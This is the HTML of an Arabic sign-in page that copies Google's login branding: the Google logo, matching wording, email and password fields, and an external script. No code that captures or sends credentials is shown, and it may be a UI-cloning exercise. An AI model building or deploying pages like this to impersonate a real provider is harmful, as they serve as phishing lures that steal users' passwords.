<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تسجيل الدخول</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="login-wrapper">
  
  <div class="login-card">
    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">

    <h2>تسجيل الدخول</h2>
    <p class="subtitle">استخدام حسابك للمتابعة</p>

    <form>
      <div class="input-group">
        <input type="email" required>
        <label>البريد الإلكتروني أو الهاتف</label>
      </div>

      <div class="input-group">
        <input type="password" required>
        <label>كلمة المرور</label>
      </div>

      <a href="#" class="link">هل نسيت كلمة المرور؟</a>

      <button type="submit" class="next-btn">تسجيل الدخول</button>
    </form>
  </div>

  <div class="footer">
    <select>
      <option>العربية</option>
      <option>English</option>
    </select>
  </div>

</div>
<script src="js.js"></script>
</body>
</html>
